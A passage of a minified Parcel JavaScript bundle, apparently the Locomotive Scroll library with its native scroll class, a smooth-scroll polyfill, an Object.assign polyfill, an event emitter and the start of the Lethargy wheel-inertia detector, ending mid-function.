parcelRequire = (function (t, e, i, n) {
  var r,
    s = "function" == typeof parcelRequire && parcelRequire,
    o = "function" == typeof require && require;
  function a(i, n) {
    if (!e[i]) {
      if (!t[i]) {
        var r = "function" == typeof parcelRequire && parcelRequire;
        if (!n && r) return r(i, !0);
        if (s) return s(i, !0);
        if (o && "string" == typeof i) return o(i);
        var l = new Error("Cannot find module '" + i + "'");
        throw ((l.code = "MODULE_NOT_FOUND"), l);
      }
      (u.resolve = function (e) {
        return t[i][1][e] || e;
      }),
        (u.cache = {});
      var c = (e[i] = new a.Module(i));
      t[i][0].call(c.exports, u, c, c.exports, this);
    }
    return e[i].exports;
    function u(t) {
      return a(u.resolve(t));
    }
  }
  (a.isParcelRequire = !0),
    (a.Module = function (t) {
      (this.id = t), (this.bundle = a), (this.exports = {});
    }),
    (a.modules = t),
    (a.cache = e),
    (a.parent = s),
    (a.register = function (e, i) {
      t[e] = [
        function (t, e) {
          e.exports = i;
        },
        {},
      ];
    });
  for (var l = 0; l < i.length; l++)
    try {
      a(i[l]);
    } catch (t) {
      r || (r = t);
    }
  if (i.length) {
    var c = a(i[i.length - 1]);
    "object" == typeof exports && "undefined" != typeof module
      ? (module.exports = c)
      : "function" == typeof define &&
        define.amd &&
        define(function () {
          return c;
        });
  }
  if (((parcelRequire = a), r)) throw r;
  return a;
})(
  {
    ez7q: [
      function (t, e, i) {
        var n = arguments[3];
        function r(t, e) {
          if (!(t instanceof e))
            throw new TypeError("Cannot call a class as a function");
        }
        function s(t, e) {
          for (var i = 0; i < e.length; i++) {
            var n = e[i];
            (n.enumerable = n.enumerable || !1),
              (n.configurable = !0),
              "value" in n && (n.writable = !0),
              Object.defineProperty(t, n.key, n);
          }
        }
        function o(t, e, i) {
          return e && s(t.prototype, e), i && s(t, i), t;
        }
        function a(t, e, i) {
          return (
            e in t
              ? Object.defineProperty(t, e, {
                  value: i,
                  enumerable: !0,
                  configurable: !0,
                  writable: !0,
                })
              : (t[e] = i),
            t
          );
        }
        function l(t, e) {
          var i = Object.keys(t);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(t);
            e &&
              (n = n.filter(function (e) {
                return Object.getOwnPropertyDescriptor(t, e).enumerable;
              })),
              i.push.apply(i, n);
          }
          return i;
        }
        function c(t) {
          for (var e = 1; e < arguments.length; e++) {
            var i = null != arguments[e] ? arguments[e] : {};
            e % 2
              ? l(Object(i), !0).forEach(function (e) {
                  a(t, e, i[e]);
                })
              : Object.getOwnPropertyDescriptors
              ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(i))
              : l(Object(i)).forEach(function (e) {
                  Object.defineProperty(
                    t,
                    e,
                    Object.getOwnPropertyDescriptor(i, e)
                  );
                });
          }
          return t;
        }
        function u(t, e) {
          if ("function" != typeof e && null !== e)
            throw new TypeError(
              "Super expression must either be null or a function"
            );
          (t.prototype = Object.create(e && e.prototype, {
            constructor: { value: t, writable: !0, configurable: !0 },
          })),
            e && f(t, e);
        }
        function h(t) {
          return (h = Object.setPrototypeOf
            ? Object.getPrototypeOf
            : function (t) {
                return t.__proto__ || Object.getPrototypeOf(t);
              })(t);
        }
        function f(t, e) {
          return (f =
            Object.setPrototypeOf ||
            function (t, e) {
              return (t.__proto__ = e), t;
            })(t, e);
        }
        function d() {
          if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
          if (Reflect.construct.sham) return !1;
          if ("function" == typeof Proxy) return !0;
          try {
            return (
              Date.prototype.toString.call(
                Reflect.construct(Date, [], function () {})
              ),
              !0
            );
          } catch (t) {
            return !1;
          }
        }
        function p(t) {
          if (void 0 === t)
            throw new ReferenceError(
              "this hasn't been initialised - super() hasn't been called"
            );
          return t;
        }
        function m(t, e) {
          return !e || ("object" != typeof e && "function" != typeof e)
            ? p(t)
            : e;
        }
        function g(t) {
          var e = d();
          return function () {
            var i,
              n = h(t);
            if (e) {
              var r = h(this).constructor;
              i = Reflect.construct(n, arguments, r);
            } else i = n.apply(this, arguments);
            return m(this, i);
          };
        }
        function v(t, e) {
          for (
            ;
            !Object.prototype.hasOwnProperty.call(t, e) && null !== (t = h(t));

          );
          return t;
        }
        function _(t, e, i) {
          return (_ =
            "undefined" != typeof Reflect && Reflect.get
              ? Reflect.get
              : function (t, e, i) {
                  var n = v(t, e);
                  if (n) {
                    var r = Object.getOwnPropertyDescriptor(n, e);
                    return r.get ? r.get.call(i) : r.value;
                  }
                })(t, e, i || t);
        }
        function y(t, e) {
          return x(t) || S(t, e) || k(t, e) || A();
        }
        function b(t) {
          return w(t) || T(t) || k(t) || E();
        }
        function w(t) {
          if (Array.isArray(t)) return O(t);
        }
        function x(t) {
          if (Array.isArray(t)) return t;
        }
        function T(t) {
          if ("undefined" != typeof Symbol && Symbol.iterator in Object(t))
            return Array.from(t);
        }
        function S(t, e) {
          if ("undefined" != typeof Symbol && Symbol.iterator in Object(t)) {
            var i = [],
              n = !0,
              r = !1,
              s = void 0;
            try {
              for (
                var o, a = t[Symbol.iterator]();
                !(n = (o = a.next()).done) &&
                (i.push(o.value), !e || i.length !== e);
                n = !0
              );
            } catch (t) {
              (r = !0), (s = t);
            } finally {
              try {
                n || null == a.return || a.return();
              } finally {
                if (r) throw s;
              }
            }
            return i;
          }
        }
        function k(t, e) {
          if (t) {
            if ("string" == typeof t) return O(t, e);
            var i = Object.prototype.toString.call(t).slice(8, -1);
            return (
              "Object" === i && t.constructor && (i = t.constructor.name),
              "Map" === i || "Set" === i
                ? Array.from(t)
                : "Arguments" === i ||
                  /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(i)
                ? O(t, e)
                : void 0
            );
          }
        }
        function O(t, e) {
          (null == e || e > t.length) && (e = t.length);
          for (var i = 0, n = new Array(e); i < e; i++) n[i] = t[i];
          return n;
        }
        function E() {
          throw new TypeError(
            "Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
          );
        }
        function A() {
          throw new TypeError(
            "Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
          );
        }
        Object.defineProperty(i, "__esModule", { value: !0 }),
          (i.Smooth = i.Native = i.default = void 0);
        var P = {
            el: document,
            name: "scroll",
            offset: [0, 0],
            repeat: !1,
            smooth: !1,
            initPosition: { x: 0, y: 0 },
            direction: "vertical",
            gestureDirection: "vertical",
            reloadOnContextChange: !1,
            lerp: 0.1,
            class: "is-inview",
            scrollbarContainer: !1,
            scrollbarClass: "c-scrollbar",
            scrollingClass: "has-scroll-scrolling",
            draggingClass: "has-scroll-dragging",
            smoothClass: "has-scroll-smooth",
            initClass: "has-scroll-init",
            getSpeed: !1,
            getDirection: !1,
            scrollFromAnywhere: !1,
            multiplier: 1,
            firefoxMultiplier: 50,
            touchMultiplier: 2,
            resetNativeScroll: !0,
            tablet: {
              smooth: !1,
              direction: "vertical",
              gestureDirection: "vertical",
              breakpoint: 1024,
            },
            smartphone: {
              smooth: !1,
              direction: "vertical",
              gestureDirection: "vertical",
            },
          },
          C = (function () {
            function t() {
              var e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : {};
              r(this, t),
                Object.assign(this, P, e),
                (this.smartphone = P.smartphone),
                e.smartphone && Object.assign(this.smartphone, e.smartphone),
                (this.tablet = P.tablet),
                e.tablet && Object.assign(this.tablet, e.tablet),
                (this.namespace = "locomotive"),
                (this.html = document.documentElement),
                (this.windowHeight = window.innerHeight),
                (this.windowWidth = window.innerWidth),
                (this.windowMiddle = {
                  x: this.windowWidth / 2,
                  y: this.windowHeight / 2,
                }),
                (this.els = {}),
                (this.currentElements = {}),
                (this.listeners = {}),
                (this.hasScrollTicking = !1),
                (this.hasCallEventSet = !1),
                (this.checkScroll = this.checkScroll.bind(this)),
                (this.checkResize = this.checkResize.bind(this)),
                (this.checkEvent = this.checkEvent.bind(this)),
                (this.instance = {
                  scroll: { x: 0, y: 0 },
                  limit: {
                    x: this.html.offsetWidth,
                    y: this.html.offsetHeight,
                  },
                  currentElements: this.currentElements,
                }),
                this.isMobile
                  ? this.isTablet
                    ? (this.context = "tablet")
                    : (this.context = "smartphone")
                  : (this.context = "desktop"),
                this.isMobile &&
                  (this.direction = this[this.context].direction),
                "horizontal" === this.direction
                  ? (this.directionAxis = "x")
                  : (this.directionAxis = "y"),
                this.getDirection && (this.instance.direction = null),
                this.getDirection && (this.instance.speed = 0),
                this.html.classList.add(this.initClass),
                window.addEventListener("resize", this.checkResize, !1);
            }
            return (
              o(t, [
                {
                  key: "init",
                  value: function () {
                    this.initEvents();
                  },
                },
                {
                  key: "checkScroll",
                  value: function () {
                    this.dispatchScroll();
                  },
                },
                {
                  key: "checkResize",
                  value: function () {
                    var t = this;
                    this.resizeTick ||
                      ((this.resizeTick = !0),
                      requestAnimationFrame(function () {
                        t.resize(), (t.resizeTick = !1);
                      }));
                  },
                },
                { key: "resize", value: function () {} },
                {
                  key: "checkContext",
                  value: function () {
                    if (this.reloadOnContextChange) {
                      (this.isMobile =
                        /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                          navigator.userAgent
                        ) ||
                        ("MacIntel" === navigator.platform &&
                          navigator.maxTouchPoints > 1) ||
                        this.windowWidth < this.tablet.breakpoint),
                        (this.isTablet =
                          this.isMobile &&
                          this.windowWidth >= this.tablet.breakpoint);
                      var t = this.context;
                      this.isMobile
                        ? this.isTablet
                          ? (this.context = "tablet")
                          : (this.context = "smartphone")
                        : (this.context = "desktop"),
                        t != this.context &&
                          ("desktop" == t ? this.smooth : this[t].smooth) !=
                            ("desktop" == this.context
                              ? this.smooth
                              : this[this.context].smooth) &&
                          window.location.reload();
                    }
                  },
                },
                {
                  key: "initEvents",
                  value: function () {
                    var t = this;
                    (this.scrollToEls = this.el.querySelectorAll(
                      "[data-".concat(this.name, "-to]")
                    )),
                      (this.setScrollTo = this.setScrollTo.bind(this)),
                      this.scrollToEls.forEach(function (e) {
                        e.addEventListener("click", t.setScrollTo, !1);
                      });
                  },
                },
                {
                  key: "setScrollTo",
                  value: function (t) {
                    t.preventDefault(),
                      this.scrollTo(
                        t.currentTarget.getAttribute(
                          "data-".concat(this.name, "-href")
                        ) || t.currentTarget.getAttribute("href"),
                        {
                          offset: t.currentTarget.getAttribute(
                            "data-".concat(this.name, "-offset")
                          ),
                        }
                      );
                  },
                },
                { key: "addElements", value: function () {} },
                {
                  key: "detectElements",
                  value: function (t) {
                    var e = this,
                      i = this.instance.scroll.y,
                      n = i + this.windowHeight,
                      r = this.instance.scroll.x,
                      s = r + this.windowWidth;
                    Object.entries(this.els).forEach(function (o) {
                      var a = y(o, 2),
                        l = a[0],
                        c = a[1];
                      if (
                        (!c ||
                          (c.inView && !t) ||
                          ("horizontal" === e.direction
                            ? s >= c.left && r < c.right && e.setInView(c, l)
                            : n >= c.top && i < c.bottom && e.setInView(c, l)),
                        c && c.inView)
                      )
                        if ("horizontal" === e.direction) {
                          var u = c.right - c.left;
                          (c.progress =
                            (e.instance.scroll.x - (c.left - e.windowWidth)) /
                            (u + e.windowWidth)),
                            (s < c.left || r > c.right) && e.setOutOfView(c, l);
                        } else {
                          var h = c.bottom - c.top;
                          (c.progress =
                            (e.instance.scroll.y - (c.top - e.windowHeight)) /
                            (h + e.windowHeight)),
                            (n < c.top || i > c.bottom) && e.setOutOfView(c, l);
                        }
                    }),
                      (this.hasScrollTicking = !1);
                  },
                },
                {
                  key: "setInView",
                  value: function (t, e) {
                    (this.els[e].inView = !0),
                      t.el.classList.add(t.class),
                      (this.currentElements[e] = t),
                      t.call &&
                        this.hasCallEventSet &&
                        (this.dispatchCall(t, "enter"),
                        t.repeat || (this.els[e].call = !1));
                  },
                },
                {
                  key: "setOutOfView",
                  value: function (t, e) {
                    var i = this;
                    (this.els[e].inView = !1),
                      Object.keys(this.currentElements).forEach(function (t) {
                        t === e && delete i.currentElements[t];
                      }),
                      t.call &&
                        this.hasCallEventSet &&
                        this.dispatchCall(t, "exit"),
                      t.repeat && t.el.classList.remove(t.class);
                  },
                },
                {
                  key: "dispatchCall",
                  value: function (t, e) {
                    (this.callWay = e),
                      (this.callValue = t.call.split(",").map(function (t) {
                        return t.trim();
                      })),
                      (this.callObj = t),
                      1 == this.callValue.length &&
                        (this.callValue = this.callValue[0]);
                    var i = new Event(this.namespace + "call");
                    this.el.dispatchEvent(i);
                  },
                },
                {
                  key: "dispatchScroll",
                  value: function () {
                    var t = new Event(this.namespace + "scroll");
                    this.el.dispatchEvent(t);
                  },
                },
                {
                  key: "setEvents",
                  value: function (t, e) {
                    this.listeners[t] || (this.listeners[t] = []);
                    var i = this.listeners[t];
                    i.push(e),
                      1 === i.length &&
                        this.el.addEventListener(
                          this.namespace + t,
                          this.checkEvent,
                          !1
                        ),
                      "call" === t &&
                        ((this.hasCallEventSet = !0), this.detectElements(!0));
                  },
                },
                {
                  key: "unsetEvents",
                  value: function (t, e) {
                    if (this.listeners[t]) {
                      var i = this.listeners[t],
                        n = i.indexOf(e);
                      n < 0 ||
                        (i.splice(n, 1),
                        0 === i.index &&
                          this.el.removeEventListener(
                            this.namespace + t,
                            this.checkEvent,
                            !1
                          ));
                    }
                  },
                },
                {
                  key: "checkEvent",
                  value: function (t) {
                    var e = this,
                      i = t.type.replace(this.namespace, ""),
                      n = this.listeners[i];
                    n &&
                      0 !== n.length &&
                      n.forEach(function (t) {
                        switch (i) {
                          case "scroll":
                            return t(e.instance);
                          case "call":
                            return t(e.callValue, e.callWay, e.callObj);
                          default:
                            return t();
                        }
                      });
                  },
                },
                { key: "startScroll", value: function () {} },
                { key: "stopScroll", value: function () {} },
                {
                  key: "setScroll",
                  value: function (t, e) {
                    this.instance.scroll = { x: 0, y: 0 };
                  },
                },
                {
                  key: "destroy",
                  value: function () {
                    var t = this;
                    window.removeEventListener("resize", this.checkResize, !1),
                      Object.keys(this.listeners).forEach(function (e) {
                        t.el.removeEventListener(
                          t.namespace + e,
                          t.checkEvent,
                          !1
                        );
                      }),
                      (this.listeners = {}),
                      this.scrollToEls.forEach(function (e) {
                        e.removeEventListener("click", t.setScrollTo, !1);
                      }),
                      this.html.classList.remove(this.initClass);
                  },
                },
              ]),
              t
            );
          })(),
          M =
            "undefined" != typeof globalThis
              ? globalThis
              : "undefined" != typeof window
              ? window
              : void 0 !== n
              ? n
              : "undefined" != typeof self
              ? self
              : {};
        function j(t, e) {
          return t((e = { exports: {} }), e.exports), e.exports;
        }
        var D = j(function (t, e) {
            t.exports = {
              polyfill: function () {
                var t = window,
                  e = document;
                if (
                  !("scrollBehavior" in e.documentElement.style) ||
                  !0 === t.__forceSmoothScrollPolyfill__
                ) {
                  var i,
                    n = t.HTMLElement || t.Element,
                    r = 468,
                    s = {
                      scroll: t.scroll || t.scrollTo,
                      scrollBy: t.scrollBy,
                      elementScroll: n.prototype.scroll || l,
                      scrollIntoView: n.prototype.scrollIntoView,
                    },
                    o =
                      t.performance && t.performance.now
                        ? t.performance.now.bind(t.performance)
                        : Date.now,
                    a =
                      ((i = t.navigator.userAgent),
                      new RegExp(["MSIE ", "Trident/", "Edge/"].join("|")).test(
                        i
                      )
                        ? 1
                        : 0);
                  (t.scroll = t.scrollTo =
                    function () {
                      void 0 !== arguments[0] &&
                        (!0 !== c(arguments[0])
                          ? p.call(
                              t,
                              e.body,
                              void 0 !== arguments[0].left
                                ? ~~arguments[0].left
                                : t.scrollX || t.pageXOffset,
                              void 0 !== arguments[0].top
                                ? ~~arguments[0].top
                                : t.scrollY || t.pageYOffset
                            )
                          : s.scroll.call(
                              t,
                              void 0 !== arguments[0].left
                                ? arguments[0].left
                                : "object" != typeof arguments[0]
                                ? arguments[0]
                                : t.scrollX || t.pageXOffset,
                              void 0 !== arguments[0].top
                                ? arguments[0].top
                                : void 0 !== arguments[1]
                                ? arguments[1]
                                : t.scrollY || t.pageYOffset
                            ));
                    }),
                    (t.scrollBy = function () {
                      void 0 !== arguments[0] &&
                        (c(arguments[0])
                          ? s.scrollBy.call(
                              t,
                              void 0 !== arguments[0].left
                                ? arguments[0].left
                                : "object" != typeof arguments[0]
                                ? arguments[0]
                                : 0,
                              void 0 !== arguments[0].top
                                ? arguments[0].top
                                : void 0 !== arguments[1]
                                ? arguments[1]
                                : 0
                            )
                          : p.call(
                              t,
                              e.body,
                              ~~arguments[0].left +
                                (t.scrollX || t.pageXOffset),
                              ~~arguments[0].top + (t.scrollY || t.pageYOffset)
                            ));
                    }),
                    (n.prototype.scroll = n.prototype.scrollTo =
                      function () {
                        if (void 0 !== arguments[0])
                          if (!0 !== c(arguments[0])) {
                            var t = arguments[0].left,
                              e = arguments[0].top;
                            p.call(
                              this,
                              this,
                              void 0 === t ? this.scrollLeft : ~~t,
                              void 0 === e ? this.scrollTop : ~~e
                            );
                          } else {
                            if (
                              "number" == typeof arguments[0] &&
                              void 0 === arguments[1]
                            )
                              throw new SyntaxError(
                                "Value could not be converted"
                              );
                            s.elementScroll.call(
                              this,
                              void 0 !== arguments[0].left
                                ? ~~arguments[0].left
                                : "object" != typeof arguments[0]
                                ? ~~arguments[0]
                                : this.scrollLeft,
                              void 0 !== arguments[0].top
                                ? ~~arguments[0].top
                                : void 0 !== arguments[1]
                                ? ~~arguments[1]
                                : this.scrollTop
                            );
                          }
                      }),
                    (n.prototype.scrollBy = function () {
                      void 0 !== arguments[0] &&
                        (!0 !== c(arguments[0])
                          ? this.scroll({
                              left: ~~arguments[0].left + this.scrollLeft,
                              top: ~~arguments[0].top + this.scrollTop,
                              behavior: arguments[0].behavior,
                            })
                          : s.elementScroll.call(
                              this,
                              void 0 !== arguments[0].left
                                ? ~~arguments[0].left + this.scrollLeft
                                : ~~arguments[0] + this.scrollLeft,
                              void 0 !== arguments[0].top
                                ? ~~arguments[0].top + this.scrollTop
                                : ~~arguments[1] + this.scrollTop
                            ));
                    }),
                    (n.prototype.scrollIntoView = function () {
                      if (!0 !== c(arguments[0])) {
                        var i = (function (t) {
                            for (; t !== e.body && !1 === f(t); )
                              t = t.parentNode || t.host;
                            return t;
                          })(this),
                          n = i.getBoundingClientRect(),
                          r = this.getBoundingClientRect();
                        i !== e.body
                          ? (p.call(
                              this,
                              i,
                              i.scrollLeft + r.left - n.left,
                              i.scrollTop + r.top - n.top
                            ),
                            "fixed" !== t.getComputedStyle(i).position &&
                              t.scrollBy({
                                left: n.left,
                                top: n.top,
                                behavior: "smooth",
                              }))
                          : t.scrollBy({
                              left: r.left,
                              top: r.top,
                              behavior: "smooth",
                            });
                      } else
                        s.scrollIntoView.call(
                          this,
                          void 0 === arguments[0] || arguments[0]
                        );
                    });
                }
                function l(t, e) {
                  (this.scrollLeft = t), (this.scrollTop = e);
                }
                function c(t) {
                  if (
                    null === t ||
                    "object" != typeof t ||
                    void 0 === t.behavior ||
                    "auto" === t.behavior ||
                    "instant" === t.behavior
                  )
                    return !0;
                  if ("object" == typeof t && "smooth" === t.behavior)
                    return !1;
                  throw new TypeError(
                    "behavior member of ScrollOptions " +
                      t.behavior +
                      " is not a valid value for enumeration ScrollBehavior."
                  );
                }
                function u(t, e) {
                  return "Y" === e
                    ? t.clientHeight + a < t.scrollHeight
                    : "X" === e
                    ? t.clientWidth + a < t.scrollWidth
                    : void 0;
                }
                function h(e, i) {
                  var n = t.getComputedStyle(e, null)["overflow" + i];
                  return "auto" === n || "scroll" === n;
                }
                function f(t) {
                  var e = u(t, "Y") && h(t, "Y"),
                    i = u(t, "X") && h(t, "X");
                  return e || i;
                }
                function d(e) {
                  var i,
                    n,
                    s,
                    a,
                    l = (o() - e.startTime) / r;
                  (a = l = l > 1 ? 1 : l),
                    (i = 0.5 * (1 - Math.cos(Math.PI * a))),
                    (n = e.startX + (e.x - e.startX) * i),
                    (s = e.startY + (e.y - e.startY) * i),
                    e.method.call(e.scrollable, n, s),
                    (n === e.x && s === e.y) ||
                      t.requestAnimationFrame(d.bind(t, e));
                }
                function p(i, n, r) {
                  var a,
                    c,
                    u,
                    h,
                    f = o();
                  i === e.body
                    ? ((a = t),
                      (c = t.scrollX || t.pageXOffset),
                      (u = t.scrollY || t.pageYOffset),
                      (h = s.scroll))
                    : ((a = i), (c = i.scrollLeft), (u = i.scrollTop), (h = l)),
                    d({
                      scrollable: a,
                      method: h,
                      startTime: f,
                      startX: c,
                      startY: u,
                      x: n,
                      y: r,
                    });
                }
              },
            };
          }),
          L =
            (D.polyfill,
            (function (t) {
              u(i, t);
              var e = g(i);
              function i() {
                var t,
                  n =
                    arguments.length > 0 && void 0 !== arguments[0]
                      ? arguments[0]
                      : {};
                return (
                  r(this, i),
                  (t = e.call(this, n)).resetNativeScroll &&
                    (history.scrollRestoration &&
                      (history.scrollRestoration = "manual"),
                    window.scrollTo(0, 0)),
                  window.addEventListener("scroll", t.checkScroll, !1),
                  void 0 === window.smoothscrollPolyfill &&
                    ((window.smoothscrollPolyfill = D),
                    window.smoothscrollPolyfill.polyfill()),
                  t
                );
              }
              return (
                o(i, [
                  {
                    key: "init",
                    value: function () {
                      (this.instance.scroll.y = window.pageYOffset),
                        this.addElements(),
                        this.detectElements(),
                        _(h(i.prototype), "init", this).call(this);
                    },
                  },
                  {
                    key: "checkScroll",
                    value: function () {
                      var t = this;
                      _(h(i.prototype), "checkScroll", this).call(this),
                        this.getDirection && this.addDirection(),
                        this.getSpeed &&
                          (this.addSpeed(), (this.speedTs = Date.now())),
                        (this.instance.scroll.y = window.pageYOffset),
                        Object.entries(this.els).length &&
                          (this.hasScrollTicking ||
                            (requestAnimationFrame(function () {
                              t.detectElements();
                            }),
                            (this.hasScrollTicking = !0)));
                    },
                  },
                  {
                    key: "addDirection",
                    value: function () {
                      window.pageYOffset > this.instance.scroll.y
                        ? "down" !== this.instance.direction &&
                          (this.instance.direction = "down")
                        : window.pageYOffset < this.instance.scroll.y &&
                          "up" !== this.instance.direction &&
                          (this.instance.direction = "up");
                    },
                  },
                  {
                    key: "addSpeed",
                    value: function () {
                      window.pageYOffset != this.instance.scroll.y
                        ? (this.instance.speed =
                            (window.pageYOffset - this.instance.scroll.y) /
                            Math.max(1, Date.now() - this.speedTs))
                        : (this.instance.speed = 0);
                    },
                  },
                  {
                    key: "resize",
                    value: function () {
                      Object.entries(this.els).length &&
                        ((this.windowHeight = window.innerHeight),
                        this.updateElements());
                    },
                  },
                  {
                    key: "addElements",
                    value: function () {
                      var t = this;
                      (this.els = {}),
                        this.el
                          .querySelectorAll("[data-" + this.name + "]")
                          .forEach(function (e, i) {
                            e.getBoundingClientRect();
                            var n,
                              r,
                              s,
                              o = e.dataset[t.name + "Class"] || t.class,
                              a =
                                "string" == typeof e.dataset[t.name + "Id"]
                                  ? e.dataset[t.name + "Id"]
                                  : i,
                              l =
                                "string" == typeof e.dataset[t.name + "Offset"]
                                  ? e.dataset[t.name + "Offset"].split(",")
                                  : t.offset,
                              c = e.dataset[t.name + "Repeat"],
                              u = e.dataset[t.name + "Call"],
                              h = e.dataset[t.name + "Target"],
                              f = (s =
                                void 0 !== h
                                  ? document.querySelector("".concat(h))
                                  : e).getBoundingClientRect();
                            (n = f.top + t.instance.scroll.y),
                              (r = f.left + t.instance.scroll.x);
                            var d = n + s.offsetHeight,
                              p = r + s.offsetWidth;
                            c = "false" != c && (null != c || t.repeat);
                            var m = t.getRelativeOffset(l),
                              g = {
                                el: e,
                                targetEl: s,
                                id: a,
                                class: o,
                                top: (n += m[0]),
                                bottom: (d -= m[1]),
                                left: r,
                                right: p,
                                offset: l,
                                progress: 0,
                                repeat: c,
                                inView: !1,
                                call: u,
                              };
                            (t.els[a] = g),
                              e.classList.contains(o) &&
                                t.setInView(t.els[a], a);
                          });
                    },
                  },
                  {
                    key: "updateElements",
                    value: function () {
                      var t = this;
                      Object.entries(this.els).forEach(function (e) {
                        var i = y(e, 2),
                          n = i[0],
                          r = i[1],
                          s =
                            r.targetEl.getBoundingClientRect().top +
                            t.instance.scroll.y,
                          o = s + r.targetEl.offsetHeight,
                          a = t.getRelativeOffset(r.offset);
                        (t.els[n].top = s + a[0]), (t.els[n].bottom = o - a[1]);
                      }),
                        (this.hasScrollTicking = !1);
                    },
                  },
                  {
                    key: "getRelativeOffset",
                    value: function (t) {
                      var e = [0, 0];
                      if (t)
                        for (var i = 0; i < t.length; i++)
                          "string" == typeof t[i]
                            ? t[i].includes("%")
                              ? (e[i] = parseInt(
                                  (t[i].replace("%", "") * this.windowHeight) /
                                    100
                                ))
                              : (e[i] = parseInt(t[i]))
                            : (e[i] = t[i]);
                      return e;
                    },
                  },
                  {
                    key: "scrollTo",
                    value: function (t) {
                      var e =
                          arguments.length > 1 && void 0 !== arguments[1]
                            ? arguments[1]
                            : {},
                        i = parseInt(e.offset) || 0,
                        n = !!e.callback && e.callback;
                      if ("string" == typeof t) {
                        if ("top" === t) t = this.html;
                        else if ("bottom" === t)
                          t = this.html.offsetHeight - window.innerHeight;
                        else if (!(t = document.querySelector(t))) return;
                      } else if ("number" == typeof t) t = parseInt(t);
                      else if (!t || !t.tagName)
                        return void console.warn(
                          "`target` parameter is not valid"
                        );
                      i =
                        "number" != typeof t
                          ? t.getBoundingClientRect().top +
                            i +
                            this.instance.scroll.y
                          : t + i;
                      var r = function () {
                        return parseInt(window.pageYOffset) === parseInt(i);
                      };
                      if (n) {
                        if (r()) return void n();
                        window.addEventListener("scroll", function t() {
                          r() && (window.removeEventListener("scroll", t), n());
                        });
                      }
                      window.scrollTo({ top: i, behavior: "smooth" });
                    },
                  },
                  {
                    key: "update",
                    value: function () {
                      this.addElements(), this.detectElements();
                    },
                  },
                  {
                    key: "destroy",
                    value: function () {
                      _(h(i.prototype), "destroy", this).call(this),
                        window.removeEventListener(
                          "scroll",
                          this.checkScroll,
                          !1
                        );
                    },
                  },
                ]),
                i
              );
            })(C)),
          B = Object.getOwnPropertySymbols,
          R = Object.prototype.hasOwnProperty,
          I = Object.prototype.propertyIsEnumerable;
        function z(t) {
          if (null == t)
            throw new TypeError(
              "Object.assign cannot be called with null or undefined"
            );
          return Object(t);
        }
        function F() {
          try {
            if (!Object.assign) return !1;
            var t = new String("abc");
            if (((t[5] = "de"), "5" === Object.getOwnPropertyNames(t)[0]))
              return !1;
            for (var e = {}, i = 0; i < 10; i++)
              e["_" + String.fromCharCode(i)] = i;
            if (
              "0123456789" !==
              Object.getOwnPropertyNames(e)
                .map(function (t) {
                  return e[t];
                })
                .join("")
            )
              return !1;
            var n = {};
            return (
              "abcdefghijklmnopqrst".split("").forEach(function (t) {
                n[t] = t;
              }),
              "abcdefghijklmnopqrst" ===
                Object.keys(Object.assign({}, n)).join("")
            );
          } catch (t) {
            return !1;
          }
        }
        var W = F()
          ? Object.assign
          : function (t, e) {
              for (var i, n, r = z(t), s = 1; s < arguments.length; s++) {
                for (var o in (i = Object(arguments[s])))
                  R.call(i, o) && (r[o] = i[o]);
                if (B) {
                  n = B(i);
                  for (var a = 0; a < n.length; a++)
                    I.call(i, n[a]) && (r[n[a]] = i[n[a]]);
                }
              }
              return r;
            };
        function Y() {}
        Y.prototype = {
          on: function (t, e, i) {
            var n = this.e || (this.e = {});
            return (n[t] || (n[t] = [])).push({ fn: e, ctx: i }), this;
          },
          once: function (t, e, i) {
            var n = this;
            function r() {
              n.off(t, r), e.apply(i, arguments);
            }
            return (r._ = e), this.on(t, r, i);
          },
          emit: function (t) {
            for (
              var e = [].slice.call(arguments, 1),
                i = ((this.e || (this.e = {}))[t] || []).slice(),
                n = 0,
                r = i.length;
              n < r;
              n++
            )
              i[n].fn.apply(i[n].ctx, e);
            return this;
          },
          off: function (t, e) {
            var i = this.e || (this.e = {}),
              n = i[t],
              r = [];
            if (n && e)
              for (var s = 0, o = n.length; s < o; s++)
                n[s].fn !== e && n[s].fn._ !== e && r.push(n[s]);
            return r.length ? (i[t] = r) : delete i[t], this;
          },
        };
        var N = Y,
          H = j(function (t, e) {
            (function () {
              (null !== e ? e : this).Lethargy = (function () {
                function t(t, e, i, n) {
                  (this.stability = null != t ? Math.abs(t) : 8),
                    (this.sensitivity = null != e ? 1 + Math.abs(e) : 100),
                    (this.tolerance = null != i ? 1 + Math.abs(i) : 1.1),
                    (this.delay = null != n ? n : 150),
                    (this.lastUpDeltas = function () {
                      var t, e, i;
                      for (
                        i = [], t = 1, e = 2 * this.stability;
                        1 <= e ? t <= e : t >= e;
                        1 <= e ? t++ : t--
                      )
                        i.push(null);
                      return i;
                    }.call(this)),
                    (this.lastDownDeltas = function () {
                      var t, e, i;
                      for (
                        i = [], t = 1, e = 2 * this.stability;
                        1 <= e ? t <= e : t >= e;
                        1 <= e ? t++ : t--
                      )
                        i.push(null);
                      return i;
                    }.call(this)),
                    (this.deltasTimestamp = function () {
                      var t, e, i;
                      for (
                        i = [], t = 1, e = 2 * this.stability;
                        1 <= e ? t <= e : t >= e;
                        1 <= e ? t++ : t--
                      )
                        i.push(null);
                      return i;
                    }.call(this));
                }
                return (
                  (t.prototype.check = function (t) {
                    var e;
                    return (
                      null != (t = t.originalEvent || t).wheelDelta
                        ? (e = t.wheelDelta)
                        : null != t.deltaY
                        ? (e = -40 * t.deltaY)
                        : (null == t.detail && 0 !== t.detail) ||
                          (e = -40 * t.detail),
                      this.deltasTimestamp.push(Date.now()),
                      this.deltasTimestamp.shift(),
                      e > 0
                        ? (this.lastUpDeltas.push(e),
                          this.lastUpDeltas.shift(),
                          this.isInertia(1))
                        : (this.lastDownDeltas.push(e),
                          this.lastDownDeltas.shift(),
                          this.isInertia(-1))
                    );
                  }),
                  (t.prototype.isInertia = function (t) {
                    var e, i, n, r, s, o, a;
                    return null ===
                      (e =
                        -1 === t ? this.lastDownDeltas : this.lastUpDeltas)[0]
                      ? t
                      : !(
